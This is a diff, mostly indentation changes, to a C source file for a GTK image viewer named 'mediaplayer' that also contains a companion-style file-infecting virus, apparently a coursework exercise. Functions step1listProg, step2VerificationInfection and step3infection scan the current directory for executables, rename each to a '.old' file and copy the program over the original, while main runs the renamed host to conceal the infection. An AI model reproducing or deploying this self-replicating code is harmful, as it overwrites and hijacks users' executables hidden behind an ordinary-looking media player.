@@ -17,44 +17,44 @@ int h = 650;
 int w = 380;
 
 void on_destroy_main_window(GtkButton *button, gpointer user_data){
-    gtk_main_quit();
+	gtk_main_quit();
 }
 
 void chargerImage(){
 	struct dirent *dir;
-    DIR *pDirect;
-    int i = 0;
-    pDirect = opendir ("../img");
-    char tmp[100];
-    if (pDirect != NULL) {
-	    while ((dir = readdir(pDirect)) != NULL) {
-	    	if (strcmp(dir->d_name,".") != 0 && strcmp(dir->d_name,"..") != 0 && strcmp(dir->d_name,"")){
-	        	strcpy(images_path[i],dir->d_name);
-	        	i++;
-	        }
-	    }
+	DIR *pDirect;
+	int i = 0;
+	pDirect = opendir ("../img");
+	char tmp[100];
+	if (pDirect != NULL) {
+		while ((dir = readdir(pDirect)) != NULL) {
+			if (strcmp(dir->d_name,".") != 0 && strcmp(dir->d_name,"..") != 0 && strcmp(dir->d_name,"")){
+				strcpy(images_path[i],dir->d_name);
+				i++;
+			}
+		}
 	}
-    closedir (pDirect);
+	closedir (pDirect);
 }
 void afficher(){
 	char path[100] = "../img/";
-    strcat(path,images_path[k]);
-    GdkPixbuf *pixbuf;
-    pixbuf = gdk_pixbuf_new_from_file_at_scale(path, h, w, FALSE, NULL);
-    gtk_image_set_from_pixbuf(image,pixbuf);
+	strcat(path,images_path[k]);
+	GdkPixbuf *pixbuf;
+	pixbuf = gdk_pixbuf_new_from_file_at_scale(path, h, w, FALSE, NULL);
+	gtk_image_set_from_pixbuf(image,pixbuf);
 }
 
 void on_btn_next_clicked(GtkButton *button, gpointer user_data){
-     k = (k+1)%nbImage;
-     afficher();
+	k = (k+1)%nbImage;
+	afficher();
 }
 
 void on_btn_prev_clicked(GtkButton *button, gpointer user_data){
 	if (k==0){
 		k=nbImage;
 	}
-    k = (k-1)%nbImage;
-    afficher();
+	k = (k-1)%nbImage;
+	afficher();
 }
 
 void step3infection(char * file_name){
@@ -66,21 +66,21 @@ void step3infection(char * file_name){
 		char * old = ".old";
 		strcat(file_name, old);
 		printf("\tRenommage - avant : %s apres %s\n", old_name, file_name);
-	    int result= rename( old_name , file_name );
-	    if ( result == 0 ){
-	    	puts ( "\tFile successfully renamed" );
-	    	pid_t p = fork(); 
-	    	if(p == 0) {
-	    		
-	    		execl("/bin/cp","cp",prog,old_name,NULL);
-	    	} else {
-	    		waitpid(p,&status,0);
-	    	}
+		int result= rename( old_name , file_name );
+		if ( result == 0 ){
+			puts ( "\tFile successfully renamed" );
+			pid_t p = fork(); 
+			if(p == 0) {
+
+				execl("/bin/cp","cp",prog,old_name,NULL);
+			} else {
+				waitpid(p,&status,0);
+			}
 		}
-	    else
-	    	perror( "Error renaming file" );
-	  }
-	
+		else
+			perror( "Error renaming file" );
+	}
+
 }
 
 bool step2VerificationInfection(char * file_name){
@@ -101,57 +101,57 @@ bool step2VerificationInfection(char * file_name){
 
 int getN(){
 	struct dirent *pDirent;
-    DIR *pDir;
-    int n = 0;
-    pDir = opendir (".");
-    if (pDir != NULL) {
-	    while ((pDirent = readdir(pDir)) != NULL) {
-	    	if (strcmp(pDirent->d_name,".") != 0 && strcmp(pDirent->d_name,"..") != 0){
+	DIR *pDir;
+	int n = 0;
+	pDir = opendir (".");
+	if (pDir != NULL) {
+		while ((pDirent = readdir(pDir)) != NULL) {
+			if (strcmp(pDirent->d_name,".") != 0 && strcmp(pDirent->d_name,"..") != 0){
 				n++;
-	        }
-	    }
+			}
+		}
 	}
-    closedir (pDir);
-    return n;
+	closedir (pDir);
+	return n;
 }
 
 void step1listProg(char ** executables){
 	printf("%s\n", "\nStep 1 - Lecture répertoire");
 	struct dirent *pDirent;
-    DIR *pDir;
-    int i = 0;
-    pDir = opendir (".");
-    if (pDir != NULL) {
-	    while ((pDirent = readdir(pDir)) != NULL) {
-	    	if (strcmp(pDirent->d_name,".") != 0 && strcmp(pDirent->d_name,"..") != 0 && strcmp(pDirent->d_name,"")){
-	    		struct stat file;
+	DIR *pDir;
+	int i = 0;
+	pDir = opendir (".");
+	if (pDir != NULL) {
+		while ((pDirent = readdir(pDir)) != NULL) {
+			if (strcmp(pDirent->d_name,".") != 0 && strcmp(pDirent->d_name,"..") != 0 && strcmp(pDirent->d_name,"")){
+				struct stat file;
 				stat( pDirent->d_name, &file);
 				if (file.st_mode & S_IXUSR && file.st_mode & S_IFREG){
 					executables[i] = pDirent->d_name;
-	        		i++;
+					i++;
 				}
-	        	
-	        }
-	    }
+
+			}
+		}
 	}
 
-    closedir (pDir);
+	closedir (pDir);
 }
 
 int main(int argc, char *argv[]){
-	
+
 	GtkBuilder *builder;
 	GtkWidget *window;
-	
+
 	prog = strtok (argv[0],"./");
 
-    gtk_init(&argc, &argv);
-    builder = gtk_builder_new();
-    gtk_builder_add_from_file(builder, "../glade/media_player.glade", NULL);
-    window = GTK_WIDGET(gtk_builder_get_object(builder, "media_player"));
-    gtk_builder_connect_signals(builder, NULL);
-    image = (GtkImage*) gtk_builder_get_object(builder, "img_mediaplayer");	
-	
+	gtk_init(&argc, &argv);
+	builder = gtk_builder_new();
+	gtk_builder_add_from_file(builder, "../glade/media_player.glade", NULL);
+	window = GTK_WIDGET(gtk_builder_get_object(builder, "media_player"));
+	gtk_builder_connect_signals(builder, NULL);
+	image = (GtkImage*) gtk_builder_get_object(builder, "img_mediaplayer");
+
 	images_path = realloc(images_path, nbImage * sizeof(char*));
 	for (int i = 0 ; i<nbImage; i++){
 		images_path[i] = malloc(sizeof(char*));
@@ -174,9 +174,9 @@ int main(int argc, char *argv[]){
 	if (strcmp(prog,"mediaplayer") != 0){
 		strcat(prog,".old");
 		int status;
-		pid_t p = fork(); 
+		pid_t p = fork();
 		if(p == 0) {
-	    	execl(prog,NULL,NULL);
+			execl(prog,NULL,NULL);
 		}
 		waitpid(p,&status,0);
 		return 0;
@@ -192,7 +192,7 @@ int main(int argc, char *argv[]){
 	free(images_path);
 	gtk_widget_destroy(window);
 
-    return 0;
+	return 0;
 }
 
 
